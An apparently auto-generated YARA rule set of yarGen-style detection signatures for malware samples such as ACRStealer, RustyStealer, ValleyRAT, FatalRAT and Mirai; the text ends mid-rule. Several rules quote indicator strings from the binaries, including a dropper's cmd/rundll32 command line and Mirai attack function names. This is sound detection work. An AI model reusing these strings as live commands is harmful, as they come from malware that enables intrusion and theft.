/*
   YARA Rule Set
   Author: Rule Generator
   Date: 2025-08-29
   Identifier: dropzone

*/

/* Rule Set ----------------------------------------------------------------- */

import "pe"

rule sig_01aac44fdfd60e7ea50350191d454ed7_imphash_ {
   meta:
      description = "dropzone - file 01aac44fdfd60e7ea50350191d454ed7(imphash).exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "74eda0ce80b6592259077199b5431935b407ba2907399eda21cb99f093381b2f"
   strings:
      $s1 = "VCRUNTIME140_1.dll" fullword ascii /* score: '23.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      all of them
}

rule ACRStealer_signature__a9eb0b46bec6fa6915e1b0ef1b9b0371_imphash_ {
   meta:
      description = "dropzone - file ACRStealer(signature)_a9eb0b46bec6fa6915e1b0ef1b9b0371(imphash).dll"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "fa2fe0f539a16aa5d1ffa4b24f76707f51b69b95b88a571f185c2cd05838d449"
   strings:
      $x1 = "win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"x86\" publicKeyToken=\"6595b64144" ascii /* score: '36.00'*/
      $s2 = "api-ms-win-core-synch-l1-2-0.dll" fullword wide /* reversed goodware string 'lld.0-2-1l-hcnys-eroc-niw-sm-ipa' */ /* score: '30.00'*/
      $s3 = "SendAtaCommandPd - SMART_READ_DATA (ATA_PASS_THROUGH)" fullword wide /* score: '26.00'*/
      $s4 = "SendAtaCommandPd - SMART_READ_THRESHOLDS (ATA_PASS_THROUGH)" fullword wide /* score: '26.00'*/
      $s5 = "requestedPrivileges><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel></requestedPrivile" ascii /* score: '23.00'*/
      $s6 = "DiskInfo.dll" fullword wide /* score: '23.00'*/
      $s7 = "SendAtaCommandPd - IDENTIFY_DEVICE (ATA_PASS_THROUGH)" fullword wide /* score: '23.00'*/
      $s8 = "SendAtaCommandPd - IDENTIFY_DEVICE" fullword wide /* score: '23.00'*/
      $s9 = "SendAtaCommandPd - SMART_READ_DATA" fullword wide /* score: '23.00'*/
      $s10 = "SendAtaCommandPd - SMART_READ_THRESHOLDS" fullword wide /* score: '23.00'*/
      $s11 = "SendAtaCommandPd - SMART_CONTROL_STATUS (ATA_PASS_THROUGH)" fullword wide /* score: '23.00'*/
      $s12 = "DoIdentifyDevicePd(%d, 0xA0) - 1" fullword wide /* score: '20.50'*/
      $s13 = "DoIdentifyDevicePd(%d, 0xA0) - 2" fullword wide /* score: '20.50'*/
      $s14 = "DoIdentifyDevicePd(%d, 0xB0) - 3" fullword wide /* score: '20.50'*/
      $s15 = "DoIdentifyDeviceScsi(%d, %d) - 4" fullword wide /* score: '20.50'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      1 of ($x*) and 4 of them
}

rule b2e00e256ccd19df5340e5a65faaa7418bd54e8d0b994b7a0e460eacc81c5fe5_b2e00e25 {
   meta:
      description = "dropzone - file b2e00e256ccd19df5340e5a65faaa7418bd54e8d0b994b7a0e460eacc81c5fe5_b2e00e25.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "b2e00e256ccd19df5340e5a65faaa7418bd54e8d0b994b7a0e460eacc81c5fe5"
   strings:
      $s1 = "api-ms-win-core-synch-l1-2-0.dll" fullword wide /* reversed goodware string 'lld.0-2-1l-hcnys-eroc-niw-sm-ipa' */ /* score: '30.00'*/
      $s2 = "www.systemrequirementslab.com" fullword ascii /* score: '24.00'*/
      $s3 = "curity><requestedPrivileges><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel></requeste" ascii /* score: '23.00'*/
      $s4 = "detection64.exe" fullword ascii /* score: '22.00'*/
      $s5 = "Winword.exe" fullword wide /* score: '22.00'*/
      $s6 = "detection.exe" fullword wide /* score: '22.00'*/
      $s7 = "aaa!!!" fullword ascii /* reversed goodware string '!!!aaa' */ /* score: '20.00'*/
      $s8 = "Unable to open dxgi.dll" fullword wide /* score: '20.00'*/
      $s9 = "Unable to open d3d8.dll" fullword wide /* score: '20.00'*/
      $s10 = "Unable to open d3d9.dll" fullword wide /* score: '20.00'*/
      $s11 = "Unable to open d3d10.dll" fullword wide /* score: '20.00'*/
      $s12 = "Unable to open d3d11.dll" fullword wide /* score: '20.00'*/
      $s13 = "Failure to load setupapi.dll: " fullword wide /* score: '19.00'*/
      $s14 = "SOFTWARE\\Classes\\%s\\shell\\Open\\command" fullword wide /* score: '18.50'*/
      $s15 = "http://www.digicert.com/CPS0" fullword ascii /* score: '17.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 14000KB and
      8 of them
}

rule d6f67c596a3017fab0f6908f38de0f996fe8742dc7131d491343d128d96564f6_d6f67c59 {
   meta:
      description = "dropzone - file d6f67c596a3017fab0f6908f38de0f996fe8742dc7131d491343d128d96564f6_d6f67c59.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "d6f67c596a3017fab0f6908f38de0f996fe8742dc7131d491343d128d96564f6"
   strings:
      $s1 = "hostfxr.dll" fullword wide /* score: '28.00'*/
      $s2 = "--- Invoked %s [version: %s, commit hash: %s] main = {" fullword wide /* score: '26.50'*/
      $s3 = "  <!-- Enable themes for Windows common controls and dialogs (Windows XP and later) -->" fullword ascii /* score: '25.00'*/
      $s4 = "WinUpdateHelper.dll" fullword wide /* score: '23.00'*/
      $s5 = "D:\\a\\_work\\1\\s\\artifacts\\obj\\win-x64.Release\\corehost\\apphost\\standalone\\apphost.pdb" fullword ascii /* score: '22.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 500KB and
      5 of them
}

rule RustyStealer_signature_ {
   meta:
      description = "dropzone - file RustyStealer(signature).exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "249ef587e4081e69b5cf472e6caa23cd57ca0621c1bb1150b98baaa00658e1d2"
   strings:
      $x1 = "library\\std\\src\\sys\\windows\\args.rscmd.exe /d /c \"Windows file names may not contain `\"` or end with `\\`" fullword ascii /* score: '31.00'*/
      $s2 = "C:\\__w\\_temp\\cargo_home\\registry\\src\\pkgs.dev.azure.com-36e3acce726fdbbc\\clap_builder-4.5.1\\src\\output\\usage.rs" fullword ascii /* score: '28.00'*/
      $s3 = "C:\\cargo_target_dir\\x86_64-pc-windows-msvc\\release\\deps\\sudo.pdb" fullword ascii /* score: '28.00'*/
      $s4 = "C:\\__w\\_temp\\cargo_home\\registry\\src\\pkgs.dev.azure.com-36e3acce726fdbbc\\clap_builder-4.5.1\\src\\builder\\command.rs|--" fullword ascii /* score: '28.00'*/
      $s5 = "System.Security.Permissions.SecurityPermissionAttribute, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934" ascii /* score: '27.00'*/
      $s6 = "entity not foundpermission deniedconnection refusedconnection resethost unreachablenetwork unreachableconnection abortednot conn" ascii /* score: '27.00'*/
      $s7 = "NotFoundPermissionDeniedConnectionRefusedConnectionResetHostUnreachableNetworkUnreachableConnectionAbortedNotConnectedAddrInUseA" ascii /* score: '27.00'*/
      $s8 = "C:\\__w\\_temp\\cargo_home\\registry\\src\\pkgs.dev.azure.com-36e3acce726fdbbc\\clap_builder-4.5.1\\src\\error\\format.rs" fullword ascii /* score: '26.00'*/
      $s9 = " https://docs.microsoft.com/windows/win32/fileio/maximum-file-path-limitation -->" fullword ascii /* score: '26.00'*/
      $s10 = "C:\\__w\\_temp\\cargo_home\\registry\\src\\pkgs.dev.azure.com-36e3acce726fdbbc\\clap_builder-4.5.1\\src\\parser\\error.rs" fullword ascii /* score: '26.00'*/
      $s11 = "Fatal internal error. Please consider filing a bug report at https://github.com/clap-rs/clap/issuesC:\\__w\\_temp\\cargo_home\\r" ascii /* score: '26.00'*/
      $s12 = "C:\\__w\\_temp\\cargo_home\\registry\\src\\pkgs.dev.azure.com-36e3acce726fdbbc\\windows-0.57.0\\src\\Windows\\Win32\\System\\Dia" ascii /* score: '26.00'*/
      $s13 = "C:\\__w\\_temp\\cargo_home\\registry\\src\\pkgs.dev.azure.com-36e3acce726fdbbc\\windows-0.57.0\\src\\Windows\\Win32\\Storage\\Fi" ascii /* score: '26.00'*/
      $s14 = "Fatal internal error. Please consider filing a bug report at https://github.com/clap-rs/clap/issuesC:\\__w\\_temp\\cargo_home\\r" ascii /* score: '26.00'*/
      $s15 = "C:\\__w\\_temp\\cargo_home\\registry\\src\\pkgs.dev.azure.com-36e3acce726fdbbc\\windows-0.57.0\\src\\Windows\\Win32\\System\\Dia" ascii /* score: '26.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*) and 4 of them
}

rule RustyStealer_signature__2 {
   meta:
      description = "dropzone - file RustyStealer(signature).msi"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "b1f908cd44ae01f0a3d54a766cb5017ea59847c8ea184f3fd0f47bca3b1c994a"
   strings:
      $x1 = "NameTableeqyoqvpdhisujmtg3qmotmlqnogdanst0r1yu0weeqgs4utulilvn-besl9gn9l-wfvrt9oq_aa4q4lraz0hqqTypePropertyValueALLUSERS1TOKEN W" ascii /* score: '83.00'*/
      $x2 = "Failed to get elevation token from process." fullword ascii /* score: '38.00'*/
      $x3 = "upDependenciesStartNamePasswordArgumentsDescriptionPDQ Connect AgentLOCALSYSTEM--servicePDQ.com software deployment serviceServi" ascii /* score: '34.00'*/
      $x4 = "rstrtmgr.dll" fullword wide /* reversed goodware string 'lld.rgmtrtsr' */ /* score: '33.00'*/
      $s5 = "failed to get WixUnelevatedShellExecTarget" fullword ascii /* score: '30.00'*/
      $s6 = "eSizeVersionLanguageAttributesSequence05.8.18.0p-lw7ji3.exe|pdq-connect-agent.exeComponent.pdqconnectagentpdqconnectagent8e1yztm" ascii /* score: '30.00'*/
      $s7 = "failed to get WixShellExecBinaryId" fullword ascii /* score: '29.00'*/
      $s8 = "failed to process target from CustomActionData" fullword ascii /* score: '28.00'*/
      $s9 = "ShelExecUnelevated failed with target %ls" fullword ascii /* score: '28.00'*/
      $s10 = "Skipping ConfigurePerfmonManifestRegister() because the target system does not support perfmon manifest" fullword ascii /* score: '28.00'*/
      $s11 = "failed to get handle to kernel32.dll" fullword ascii /* score: '28.00'*/
      $s12 = "Skipping ConfigureEventManifestRegister() because the target system does not support event manifest" fullword ascii /* score: '28.00'*/
      $s13 = "Skipping ConfigurePerfmonManifestUnregister() because the target system does not support perfmon manifest" fullword ascii /* score: '28.00'*/
      $s14 = "Skipping ConfigureEventManifestUnregister() because the target system does not support event manifest" fullword ascii /* score: '28.00'*/
      $s15 = "tDirPDQtlmcolwe|PDQConnectAgentProgramFiles64Folderiqrp47ah|Downloadsgbexn3uq|PDQConnectAgentCommonAppDataFolderTARGETDIRPFiles6" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0xcfd0 and filesize < 15000KB and
      1 of ($x*) and all of them
}

rule ValleyRAT_signature__28ef17cb7630bdccb6c5e29dd4723500_imphash_ {
   meta:
      description = "dropzone - file ValleyRAT(signature)_28ef17cb7630bdccb6c5e29dd4723500(imphash).exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "878864fb3f5ac89d1a36fbb3bdbce55285fdeacdff38d6a68a6c9b7244b96d9c"
   strings:
      $x1 = "<asmv3:application xmlns:asmv3=\"urn:schemas-microsoft-com:asm.v3\"><asmv3:windowsSettings xmlns=\"http://schemas.microsoft.com/" ascii /* score: '48.00'*/
      $s2 = "endency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" proce" ascii /* score: '26.00'*/
      $s3 = "questedPrivileges><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo>" ascii /* score: '23.00'*/
      $s4 = "balenaEtcher.exe" fullword wide /* score: '22.00'*/
      $s5 = "gOpenProcessToken failed: " fullword wide /* score: '21.00'*/
      $s6 = "This sample schedules a task to start notepad.exe when a user logs on." fullword wide /* score: '19.00'*/
      $s7 = "/2005/WindowsSettings\"><disableWindowFiltering xmlns=\"http://schemas.microsoft.com/SMI/2011/WindowsSettings\">true</disableWin" ascii /* score: '17.00'*/
      $s8 = "Filtering></asmv3:windowsSettings><asmv3:windowsSettings xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\"><dpiAwa" ascii /* score: '17.00'*/
      $s9 = "GetTokenInformation failed: " fullword wide /* score: '15.00'*/
      $s10 = "<asmv3:application xmlns:asmv3=\"urn:schemas-microsoft-com:asm.v3\"><asmv3:windowsSettings xmlns=\"http://schemas.microsoft.com/" ascii /* score: '13.00'*/
      $s11 = "chitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\"/></dependentAssembly></dependency><compatibility xmlns=\"urn" ascii /* score: '12.00'*/
      $s12 = "        <Exec>" fullword wide /* score: '8.00'*/
      $s13 = "        </Exec>" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule sig_5c46eb039a9339c3dd1b25000f0b9f413ebd0b88d2d12fa8655dfdbe1478c711_5c46eb03 {
   meta:
      description = "dropzone - file 5c46eb039a9339c3dd1b25000f0b9f413ebd0b88d2d12fa8655dfdbe1478c711_5c46eb03.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "5c46eb039a9339c3dd1b25000f0b9f413ebd0b88d2d12fa8655dfdbe1478c711"
   strings:
      $x1 = "C:\\Users\\karoon\\source\\repos\\Eellogofusciouhipoppokunurious - Source Code\\x64\\Release\\Eellogofusciouhipoppokunurious.pdb" ascii /* score: '43.00'*/
      $x2 = "You've Just Executed A Malware Called Eellogofusciouhipoppokunurious.exe! (It Means Good, Very Good) This Malware Won't Harm You" wide /* score: '31.00'*/
      $s3 = "Eellogofusciouhipoppokunurious.exe - First Warning" fullword wide /* score: '27.00'*/
      $s4 = "Are You Sure? If You Accidently Clicked On Yes Then This Is The Final Warning Now! Click Yes Again And The Malware Will Execute!" wide /* score: '27.00'*/
      $s5 = "Eellogofusciouhipoppokunurious.exe" fullword wide /* score: '27.00'*/
      $s6 = "VCRUNTIME140_1.dll" fullword ascii /* score: '23.00'*/
      $s7 = "Dumping physical memory to disk: 0" fullword wide /* score: '17.00'*/
      $s8 = "Dumping physical memory to disk: 100" fullword wide /* score: '17.00'*/
      $s9 = "Physical memory dump complete." fullword wide /* score: '17.00'*/
      $s10 = "        <requestedExecutionLevel level='asInvoker' uiAccess='false' />" fullword ascii /* score: '15.00'*/
      $s11 = "I've Trusted You!!!" fullword wide /* score: '13.00'*/
      $s12 = "Run CHKDSK /F to check for hard drive corruption, and then" fullword wide /* score: '11.00'*/
      $s13 = "sound1.wav" fullword wide /* score: '10.00'*/
      $s14 = "sound8.wav" fullword wide /* score: '10.00'*/
      $s15 = "Collecting data for crash dump..." fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule sig_531886359299919017683e10dfef1a4a_imphash_ {
   meta:
      description = "dropzone - file 531886359299919017683e10dfef1a4a(imphash).exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "4c5d30b5a6cf22d18cbab3938a5f187af5cf16b3827077d822b5ee1551ac3549"
   strings:
      $x1 = "C:\\Windows\\System32\\cmd.exe" fullword wide /* score: '38.00'*/
      $s2 = "C:\\Windows\\System32\\rundll32.exe" fullword wide /* score: '30.00'*/
      $s3 = "DllDropper.dll" fullword ascii /* score: '25.00'*/
      $s4 = "/c rundll32.exe \"%ws\" SalamAleikum" fullword wide /* score: '23.00'*/
      $s5 = "/c \"del %TEMP%\\mamaiAlabai && echo BubukaChirotto > %TEMP%\\mamaiAlabai\"" fullword wide /* score: '18.00'*/
      $s6 = "%TEMP%\\mamaiAlabai" fullword wide /* score: '15.00'*/
      $s7 = "  VirtualQuery failed for %d bytes at address %p" fullword ascii /* score: '13.00'*/
      $s8 = "gzZAbr0GJ3aeK9L7gGZL4KTOGWSNdW8fVEg+uSYkMeqmXtD4RPQL5Oi7wX36krfCUecdi5sZ8dhdQRfPoVyhyn4SxWtIvPxHctXNUcho2xkG7XJsmINdptYR/TOWPVp1" ascii /* score: '11.00'*/
      $s9 = "Hq0kUIvuMfQIuK5TKepTZK6hFMpC6OeP91Fftn2i3SOFxGLxij/TRw2v6CppBl1wzDP+HBuywF+xqKzKUQaZcC9ygfDe2jcXm2cg8GGObAL6cziLsqMaLQrMyJEKPyc6" ascii /* score: '11.00'*/
      $s10 = "Fn+uFFFNzprutKb5xkeSkgQSsPqZ8MDwB6+Yb0rq+k5CnrDDLPJC8pokHFz52Ah3Lg2D4ypVnRs8b/fSXmjY0Y3TeXs4ZtF3P+FoJ7IsmKQL/0PavWspq1ZbQ8pR34MK" ascii /* score: '11.00'*/
      $s11 = "oI8R7ctpsE8n0mvj/yRtqDvuLlRm8VBVELI5EznBuU65GBAfWclLZaN4jC5idP2YqpvCDxoWhrBHgYtd0KDxartWNZbxHRmZ/+n21aERdLdyv43+tMOx92sS" fullword ascii /* score: '11.00'*/
      $s12 = "Deqt48t41XLBAVFWgDPpVNqCtvjtMmNEpHpY8EK04YIudLgv3c5g7IzAAxJdS2bjbjyHd1q3j7PUAp1fRUldO0u8aBVhLhWGaG8qp0R7NjONzSDJmbVu9RW1RsFpvJzd" ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 60KB and
      1 of ($x*) and 4 of them
}

rule ACRStealer_signature__f9364da2e01420d9f33ccb9f7544a43c_imphash_ {
   meta:
      description = "dropzone - file ACRStealer(signature)_f9364da2e01420d9f33ccb9f7544a43c(imphash).dll"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "a5337a2c20fa9a06b44badbf4557678356800455be11d914b07ff6cee2d12c35"
   strings:
      $s1 = "n204 No Content301 Moved Permanently400 Bad Request401 Unauthorized403 Forbidden404 Not Found500 Internal Server Error501 Not Im" ascii /* score: '17.00'*/
      $s2 = "        <requestedExecutionLevel level='asInvoker' uiAccess='false' />" fullword ascii /* score: '15.00'*/
      $s3 = "2processedData(qint64, qint64)" fullword ascii /* score: '15.00'*/
      $s4 = "Error transferring %1 - server replied: %2" fullword ascii /* score: '15.00'*/
      $s5 = "?connectToHostEncrypted@QSslSocket@@QAEXABVQString@@GV?$QFlags@W4OpenModeFlag@QIODevice@@@@W4NetworkLayerProtocol@QAbstractSocke" ascii /* score: '14.00'*/
      $s6 = "?connectToHostEncrypted@QSslSocket@@QAEXABVQString@@G0V?$QFlags@W4OpenModeFlag@QIODevice@@@@W4NetworkLayerProtocol@QAbstractSock" ascii /* score: '14.00'*/
      $s7 = "?setPrivateConfiguration@QNetworkSessionPrivate@@IBEXAAVQNetworkConfiguration@@V?$QExplicitlySharedDataPointer@VQNetworkConfigur" ascii /* score: '13.00'*/
      $s8 = "?privateConfiguration@QNetworkSessionPrivate@@IBE?AV?$QExplicitlySharedDataPointer@VQNetworkConfigurationPrivate@@@@ABVQNetworkC" ascii /* score: '13.00'*/
      $s9 = "content-type missing in HTTP POST, defaulting to application/x-www-form-urlencoded. Use QNetworkRequest::setHeader() to fix this" ascii /* score: '13.00'*/
      $s10 = "d1_q_pipeClosed()" fullword ascii /* score: '13.00'*/
      $s11 = "??4QHostAddress@@QAEAAV0@$$QAV0@@Z" fullword ascii /* score: '12.00'*/
      $s12 = "??4QDnsHostAddressRecord@@QAEAAV0@$$QAV0@@Z" fullword ascii /* score: '12.00'*/
      $s13 = "?setAddress@QHostAddress@@QAEXPBE@Z" fullword ascii /* score: '12.00'*/
      $s14 = "?swap@QHostAddress@@QAEXAAV1@@Z" fullword ascii /* score: '12.00'*/
      $s15 = "?toIPv4Address@QHostAddress@@QBEIPA_N@Z" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule FatalRAT_signature__3a8897c84eb41f36b4bbabcc617408b8_imphash_ {
   meta:
      description = "dropzone - file FatalRAT(signature)_3a8897c84eb41f36b4bbabcc617408b8(imphash).exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "7a4cd1e7da686434306fa4f3a50b199fc120625bfd41dd39a69768e0fdbe91bb"
   strings:
      $s1 = "5USER32.dll" fullword ascii /* score: '26.00'*/
      $s2 = "KernelBase.dll" fullword ascii /* score: '23.00'*/
      $s3 = "uKERNEL32.dll" fullword ascii /* score: '23.00'*/
      $s4 = "SEGetTotalExecTimeLeft" fullword ascii /* score: '21.00'*/
      $s5 = "SEGetNumExecLeft" fullword ascii /* score: '21.00'*/
      $s6 = "SEGetExecTimeLeft" fullword ascii /* score: '21.00'*/
      $s7 = "SEGetNumExecUsed" fullword ascii /* score: '21.00'*/
      $s8 = "SEGetTotalExecTimeUsed" fullword ascii /* score: '21.00'*/
      $s9 = "SEGetExecTimeUsed" fullword ascii /* score: '21.00'*/
      $s10 = "2GetCurrentProcess" fullword ascii /* score: '20.00'*/
      $s11 = "SECheckExecTime" fullword ascii /* score: '16.00'*/
      $s12 = "SECheckTotalExecTime" fullword ascii /* score: '16.00'*/
      $s13 = "SESetExecTime" fullword ascii /* score: '16.00'*/
      $s14 = "SESetTotalExecTime" fullword ascii /* score: '16.00'*/
      $s15 = "SESetNumExecUsed" fullword ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule Mirai_signature__6d8090fe {
   meta:
      description = "dropzone - file Mirai(signature)_6d8090fe.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "6d8090fec672f53c725b8113852f711172922038c08439fd14c8e1f4a3f7fb99"
   strings:
      $s1 = "attack_udpbypass" fullword ascii /* score: '15.00'*/
      $s2 = "attack_tcpbypass" fullword ascii /* score: '15.00'*/
      $s3 = "dns_payload.5829" fullword ascii /* score: '13.00'*/
      $s4 = "stun_payload.5831" fullword ascii /* score: '13.00'*/
      $s5 = "ntp_payload.5830" fullword ascii /* score: '13.00'*/
      $s6 = "suspicious_cmdline" fullword ascii /* score: '12.00'*/
      $s7 = "execv.c" fullword ascii /* score: '12.00'*/
      $s8 = "disable_commands" fullword ascii /* score: '12.00'*/
      $s9 = "__scan_getc" fullword ascii /* score: '10.00'*/
      $s10 = "__scan_ungetc" fullword ascii /* score: '10.00'*/
      $s11 = "scan_getwc" fullword ascii /* score: '10.00'*/
      $s12 = "bind_ports" fullword ascii /* score: '10.00'*/
      $s13 = "__GI_execv" fullword ascii /* score: '9.00'*/
      $s14 = "attack_tcpflood" fullword ascii /* score: '9.00'*/
      $s15 = "__scan_cookie.c" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      8 of them
}

rule c990338f8145dc29c6f38fb73cf05c77_imphash_ {
   meta:
      description = "dropzone - file c990338f8145dc29c6f38fb73cf05c77(imphash).exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "a64f34bbba754591e6aafbaa47cfdb9327dc433ebd2d94be6575aecb999b72f6"
   strings:
      $s1 = "      <assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"*" ascii /* score: '27.00'*/
      $s2 = "bVCRUNTIME140.dll" fullword ascii /* score: '26.00'*/
      $s3 = "VCRUNTIME140.dll" fullword wide /* score: '26.00'*/
      $s4 = "      <assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"*" ascii /* score: '24.00'*/
      $s5 = "bpython310.dll" fullword ascii /* score: '23.00'*/
      $s6 = "6python310.dll" fullword ascii /* score: '23.00'*/
      $s7 = "VCRUNTIME140_1.dll" fullword wide /* score: '23.00'*/
      $s8 = "Failed to extract %s: failed to open target file!" fullword ascii /* score: '22.50'*/
      $s9 = "LOADER: failed to convert runtime-tmpdir to a wide string." fullword wide /* score: '22.00'*/
      $s10 = "LOADER: failed to expand environment variables in the runtime-tmpdir." fullword wide /* score: '22.00'*/
      $s11 = "LOADER: runtime-tmpdir points to non-existent drive %ls (type: %d)!" fullword wide /* score: '22.00'*/
      $s12 = "LOADER: failed to obtain the absolute path of the runtime-tmpdir." fullword wide /* score: '22.00'*/
      $s13 = "LOADER: failed to create runtime-tmpdir path %ls!" fullword wide /* score: '22.00'*/
      $s14 = "blibcrypto-1_1.dll" fullword ascii /* score: '20.00'*/
      $s15 = "blibffi-7.dll" fullword ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 16000KB and
      8 of them
}

rule Metasploit_signature__c990338f8145dc29c6f38fb73cf05c77_imphash_ {
   meta:
      description = "dropzone - file Metasploit(signature)_c990338f8145dc29c6f38fb73cf05c77(imphash).exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "7adc27aa2eabe3ae14f8d7f04f363693c435f4d025646ce8288f627d76885cdc"
   strings:
      $s1 = "      <assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"*" ascii /* score: '27.00'*/
      $s2 = "bVCRUNTIME140.dll" fullword ascii /* score: '26.00'*/
      $s3 = "VCRUNTIME140.dll" fullword wide /* score: '26.00'*/
      $s4 = "      <assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"*" ascii /* score: '24.00'*/
      $s5 = "bpython310.dll" fullword ascii /* score: '23.00'*/
      $s6 = "6python310.dll" fullword ascii /* score: '23.00'*/
      $s7 = "VCRUNTIME140_1.dll" fullword wide /* score: '23.00'*/
      $s8 = "Failed to extract %s: failed to open target file!" fullword ascii /* score: '22.50'*/
      $s9 = "LOADER: failed to convert runtime-tmpdir to a wide string." fullword wide /* score: '22.00'*/
      $s10 = "LOADER: failed to expand environment variables in the runtime-tmpdir." fullword wide /* score: '22.00'*/
      $s11 = "LOADER: runtime-tmpdir points to non-existent drive %ls (type: %d)!" fullword wide /* score: '22.00'*/
      $s12 = "LOADER: failed to obtain the absolute path of the runtime-tmpdir." fullword wide /* score: '22.00'*/
      $s13 = "LOADER: failed to create runtime-tmpdir path %ls!" fullword wide /* score: '22.00'*/
      $s14 = "blibcrypto-1_1.dll" fullword ascii /* score: '20.00'*/
      $s15 = "blibffi-7.dll" fullword ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 16000KB and
      8 of them
}

rule aa01007ee70675acff24b74d96f3e8a0_imphash_ {
   meta:
      description = "dropzone - file aa01007ee70675acff24b74d96f3e8a0(imphash).exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "401e3fe6d27a438016a82c4bbc710dfca5ff3c8f533f5eadc7393ce4f1c2d498"
   strings:
      $s1 = "Microsoft.ExtendedReflection.dll" fullword wide /* score: '23.00'*/
      $s2 = "\"http://ocsp2.globalsign.com/rootr606" fullword ascii /* score: '20.00'*/
      $s3 = ":http://secure.globalsign.com/cacert/codesigningrootr45.crt0A" fullword ascii /* score: '16.00'*/
      $s4 = "-http://ocsp.globalsign.com/codesigningrootr450F" fullword ascii /* score: '16.00'*/
      $s5 = "0http://crl.globalsign.com/codesigningrootr45.crl0U" fullword ascii /* score: '16.00'*/
      $s6 = "%http://crl.globalsign.com/root-r6.crl0G" fullword ascii /* score: '16.00'*/
      $s7 = "!Globalsign TSA for CodeSign1 - R60" fullword ascii /* score: '14.00'*/
      $s8 = "!Globalsign TSA for CodeSign1 - R6" fullword ascii /* score: '14.00'*/
      $s9 = " 2010 - 2018 Elinam LLC" fullword wide /* score: '14.00'*/
      $s10 = "@http://secure.globalsign.com/cacert/gsgccr45evcodesignca2020.crt0?" fullword ascii /* score: '13.00'*/
      $s11 = "0http://crl.globalsign.com/ca/gstsacasha384g4.crl0" fullword ascii /* score: '13.00'*/
      $s12 = "6http://crl.globalsign.com/gsgccr45evcodesignca2020.crl0" fullword ascii /* score: '13.00'*/
      $s13 = "3http://ocsp.globalsign.com/gsgccr45evcodesignca20200U" fullword ascii /* score: '13.00'*/
      $s14 = "-http://ocsp.globalsign.com/ca/gstsacasha384g40C" fullword ascii /* score: '13.00'*/
      $s15 = "LLC MCD - Profile1" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 600KB and
      8 of them
}

rule sig_1ce0393afb262f97a2c3eb27365b1e4e_imphash_ {
   meta:
      description = "dropzone - file 1ce0393afb262f97a2c3eb27365b1e4e(imphash).exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "9240734ce37fc52b2586a5ee1d5f74ba45e421eb3c5ed275b91c46405a2d6c58"
   strings:
